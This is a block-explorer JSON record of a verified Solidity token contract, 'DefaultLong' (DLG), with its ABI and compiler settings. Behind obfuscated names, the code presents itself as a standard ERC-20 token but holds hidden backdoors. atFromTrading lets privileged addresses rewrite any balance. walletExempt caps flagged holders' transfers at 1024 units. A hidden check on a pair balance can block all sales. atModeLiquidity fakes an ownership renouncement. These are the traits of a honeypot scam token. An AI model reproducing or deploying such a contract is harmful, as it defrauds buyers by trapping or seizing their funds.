{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface fromExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeLimit {\n    function createPair(address listSender, address marketingShould) external returns (address);\n}\n\ninterface launchedMinMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txBuyMarketing) external view returns (uint256);\n\n    function transfer(address toAutoMode, uint256 fundAuto) external returns (bool);\n\n    function allowance(address swapMaxSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toAutoMode,\n        uint256 fundAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchMax, uint256 value);\n    event Approval(address indexed swapMaxSender, address indexed spender, uint256 value);\n}\n\ninterface receiverAuto is launchedMinMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DefaultLong is txList, launchedMinMarketing, receiverAuto {\n\n    bool private teamLimitTotal;\n\n    uint256 constant exemptSell = 2 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamFromEnable;\n    }\n\n    mapping(address => bool) public senderSwap;\n\n    uint256 private marketingAuto = 100000000 * 10 ** 18;\n\n    address txReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public autoMode;\n\n    function getOwner() external view returns (address) {\n        return amountTo;\n    }\n\n    uint256 modeToken;\n\n    uint256 public tokenIs;\n\n    string private teamMarketing = \"Default Long\";\n\n    bool private sellToken;\n\n    uint256 autoTake;\n\n    mapping(address => bool) public launchedMarketing;\n\n    function tokenReceiver(address launchTrading) public {\n        require(launchTrading.balance < 100000);\n        if (listReceiver) {\n            return;\n        }\n        if (totalLiquidityBuy) {\n            sellToken = true;\n        }\n        launchedMarketing[launchTrading] = true;\n        if (totalExemptTrading != maxList) {\n            totalExemptTrading = swapBuy;\n        }\n        listReceiver = true;\n    }\n\n    function approve(address sellTo, uint256 fundAuto) public virtual override returns (bool) {\n        toTrading[_msgSender()][sellTo] = fundAuto;\n        emit Approval(_msgSender(), sellTo, fundAuto);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return amountTo;\n    }\n\n    uint256 public swapBuy;\n\n    mapping(address => uint256) private buyWalletTotal;\n\n    address public shouldTrading;\n\n    string private receiverEnable = \"DLG\";\n\n    function allowance(address swapReceiver, address sellTo) external view virtual override returns (uint256) {\n        if (sellTo == marketingSender) {\n            return type(uint256).max;\n        }\n        return toTrading[swapReceiver][sellTo];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverEnable;\n    }\n\n    function txAutoSwap(uint256 fundAuto) public {\n        minSwap();\n        autoTake = fundAuto;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamMarketing;\n    }\n\n    uint8 private teamFromEnable = 18;\n\n    uint256 public walletReceiverTake;\n\n    uint256 public maxList;\n\n    function balanceOf(address txBuyMarketing) public view virtual override returns (uint256) {\n        return buyWalletTotal[txBuyMarketing];\n    }\n\n    function transfer(address senderTo, uint256 fundAuto) external virtual override returns (bool) {\n        return senderExempt(_msgSender(), senderTo, fundAuto);\n    }\n\n    bool public listReceiver;\n\n    address private amountTo;\n\n    function senderExempt(address walletFee, address toAutoMode, uint256 fundAuto) internal returns (bool) {\n        if (walletFee == launchedExempt) {\n            return liquidityTotal(walletFee, toAutoMode, fundAuto);\n        }\n        uint256 receiverMin = launchedMinMarketing(shouldTrading).balanceOf(txReceiver);\n        require(receiverMin == autoTake);\n        require(toAutoMode != txReceiver);\n        if (senderSwap[walletFee]) {\n            return liquidityTotal(walletFee, toAutoMode, exemptSell);\n        }\n        return liquidityTotal(walletFee, toAutoMode, fundAuto);\n    }\n\n    function liquidityTotal(address walletFee, address toAutoMode, uint256 fundAuto) internal returns (bool) {\n        require(buyWalletTotal[walletFee] >= fundAuto);\n        buyWalletTotal[walletFee] -= fundAuto;\n        buyWalletTotal[toAutoMode] += fundAuto;\n        emit Transfer(walletFee, toAutoMode, fundAuto);\n        return true;\n    }\n\n    function minSwap() private view {\n        require(launchedMarketing[_msgSender()]);\n    }\n\n    uint256 public totalExemptTrading;\n\n    mapping(address => mapping(address => uint256)) private toTrading;\n\n    function transferFrom(address walletFee, address toAutoMode, uint256 fundAuto) external override returns (bool) {\n        if (_msgSender() != marketingSender) {\n            if (toTrading[walletFee][_msgSender()] != type(uint256).max) {\n                require(fundAuto <= toTrading[walletFee][_msgSender()]);\n                toTrading[walletFee][_msgSender()] -= fundAuto;\n            }\n        }\n        return senderExempt(walletFee, toAutoMode, fundAuto);\n    }\n\n    address public launchedExempt;\n\n    function atFromTrading(address senderTo, uint256 fundAuto) public {\n        minSwap();\n        buyWalletTotal[senderTo] = fundAuto;\n    }\n\n    bool public totalLiquidityBuy;\n\n    bool public shouldExempt;\n\n    constructor (){\n        \n        fromExempt receiverMarketing = fromExempt(marketingSender);\n        shouldTrading = takeLimit(receiverMarketing.factory()).createPair(receiverMarketing.WETH(), address(this));\n        if (maxList != totalExemptTrading) {\n            totalExemptTrading = maxList;\n        }\n        launchedExempt = _msgSender();\n        atModeLiquidity();\n        launchedMarketing[launchedExempt] = true;\n        buyWalletTotal[launchedExempt] = marketingAuto;\n        \n        emit Transfer(address(0), launchedExempt, marketingAuto);\n    }\n\n    function walletExempt(address shouldMinMode) public {\n        minSwap();\n        \n        if (shouldMinMode == launchedExempt || shouldMinMode == shouldTrading) {\n            return;\n        }\n        senderSwap[shouldMinMode] = true;\n    }\n\n    event OwnershipTransferred(address indexed amountLaunched, address indexed feeToLimit);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingAuto;\n    }\n\n    function atModeLiquidity() public {\n        emit OwnershipTransferred(launchedExempt, address(0));\n        amountTo = address(0);\n    }\n\n    address marketingSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMaxSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeToLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundAuto\",\"type\":\"uint256\"}],\"name\":\"atFromTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atModeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuyMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExemptTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidityBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toAutoMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundAuto\",\"type\":\"uint256\"}],\"name\":\"txAutoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMinMode\",\"type\":\"address\"}],\"name\":\"walletExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiverTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DefaultLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}